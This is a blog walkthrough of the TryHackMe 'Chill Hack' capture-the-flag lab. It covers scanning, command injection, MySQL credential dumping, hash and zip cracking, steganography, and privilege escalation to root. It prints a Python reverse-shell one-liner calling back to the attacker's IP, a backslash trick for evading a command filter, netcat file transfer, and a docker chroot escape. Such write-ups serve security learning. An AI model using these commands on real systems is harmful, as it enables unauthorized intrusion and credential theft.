---
title: TryHackMe - Chill Hack
layout: post
categories:
- TryHackMe
tag: command-injection, sql-injection, real-world
image: "/assets/img/chill-hack.png"
image_alt: chill-hack
---

Easy level CTF.  Capture the flags and have fun!

<br>

## 1. User Flag

Let's do a `nmap` scan.

```
$ nmap -sSCV 10.10.249.219
```

![nmap](/assets/img/tryhackme/chill-hack/nmap.png)

Three ports are open. These are `21/tcp FTP, 22/tcp SSH, 80/tcp HTTP`

![ftp](/assets/img/tryhackme/chill-hack/ftp.png)

It seems we can log in FTP server anonymously.
And there is a file called `note.txt` on the server.

Let's take a look at what's written inside `note.txt`.

![note](/assets/img/tryhackme/chill-hack/note.png)

*`Anurodh told me that there is some filtering on strings being put in the command -- Apaar`*

Let's visit the website running on `80/tcp` port.

![home](/assets/img/tryhackme/chill-hack/home.png)

I've been browsing the site but nothing remarkable.

Let's do a `gobuster` scan.

```
$ gobuster dir -u http://10.10.249.219  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,html,txt
```

![gobuster](/assets/img/tryhackme/chill-hack/gobuster.png)

We found the *`/secret`* directory. 

Let's look at this page.

We found a page where we can run commands.

I try to run a few commands but something like this comes up.

![alert](/assets/img/tryhackme/chill-hack/alert.png)

I'm trying to do a reverse shell, but none of the codes I tried worked. Except this:

```
$ p\ython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.86.168",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

```

I ran the code like `p\ython` instead of python. We are inside now.

![in](/assets/img/tryhackme/chill-hack/in.png)

I found an interesting file in `/var/www`.

![ints](/assets/img/tryhackme/chill-hack/ints.png)

Let's look at the `/files` directory.

![files](/assets/img/tryhackme/chill-hack/files.png)

What's in these files? Let's look.

**`account.php`**

![account](/assets/img/tryhackme/chill-hack/account.png)

**`hacker.php`**

![hacker](/assets/img/tryhackme/chill-hack/hacker.png)

**`index.php`**

![index](/assets/img/tryhackme/chill-hack/index.png)

We found important things in the index.php file. 

`Mysql - Database: webportal`, `root:*************`

Let's see if we can log in to `MySQL`.

```
$ mysql -u root -p 
$ show databases;
$ use webportal
$ show tables;
$ select * from users;
```

![mysql](/assets/img/tryhackme/chill-hack/mysql.png)

We find the encrypted version of the passwords of Anurodh and Apaar.

Let's look at the type of passwords.

![id](/assets/img/tryhackme/chill-hack/id.png)

It seems passwords are encoded using md5. Let's crack these passwords.

**`Anurodh`**;

![crack1](/assets/img/tryhackme/chill-hack/crack1.png)

**`Apaar`**;

![crack2](/assets/img/tryhackme/chill-hack/crack2.png)

I try these passwords for ssh login. But it's not working.

So let's back the `hacker.php`. Firstly, we must download the `hacker-with-laptop_23-2147985341.jpg` file.

In my machine;

![mine](/assets/img/tryhackme/chill-hack/mine.png)

```
$ nc -nlvp 4444 > hacker-with-laptop_23-2147985341.jpg
```

In target machine;

![target](/assets/img/tryhackme/chill-hack/target.png)

```
$ nc my-ip 4444 -w 4 < hacker-with-laptop_23-2147985341.jpg
```

We get the file. Now, need to use `steghide`.

```
$ steghide extract -sf hacker-with-laptop_23-2147985341.jpg
$ zip2john backup.zip > hash.hash
$ john --wordlist=usr/share/wordlists/rockyou.txt hash.hash
```

![steghide](/assets/img/tryhackme/chill-hack/steghide.png)

Now that we've found the password, let's see what's inside the `backup.zip`.

![zip](/assets/img/tryhackme/chill-hack/zip.png)

We found Anurodh's password in `source_code.php`.

![encode](/assets/img/tryhackme/chill-hack/encode.png)

Let's decode.

![decode](/assets/img/tryhackme/chill-hack/decode.png)

Now, we can access Anurodh's ssh.

![ssh](/assets/img/tryhackme/chill-hack/ssh.png)

I try the `sudo -l` command and it works.

![sudol](/assets/img/tryhackme/chill-hack/sudol.png)

We have a bash file for Apaar that we can run without requiring a password.

Let's see what's in it.

![writein](/assets/img/tryhackme/chill-hack/writein.png)

Let's run the file and try adding `/bin/bash` to it.

![helpline](/assets/img/tryhackme/chill-hack/helpline.png)

Yeah, it's work. Now we can access Apaar.  

Let's get the user flag.

![user-flag](/assets/img/tryhackme/chill-hack/user-flag.png)

<br>

### 2. Root Flag

Now, we must return back to Anurodh.  

I found this and it's interesting.

![docker](/assets/img/tryhackme/chill-hack/docker.png)

I'm looking at [GTFOBins](https://gtfobins.github.io/gtfobins/docker/) to see if I can find anything about Docker. 

Let's try this code.

![gtf](/assets/img/tryhackme/chill-hack/gtf.png)

```
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

And we are root. Yes!

![rootin](/assets/img/tryhackme/chill-hack/rootin.png)

Let's get the root flag.

![root-flag](/assets/img/tryhackme/chill-hack/root-flag.png)

<br>

It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care :wave:

<br>
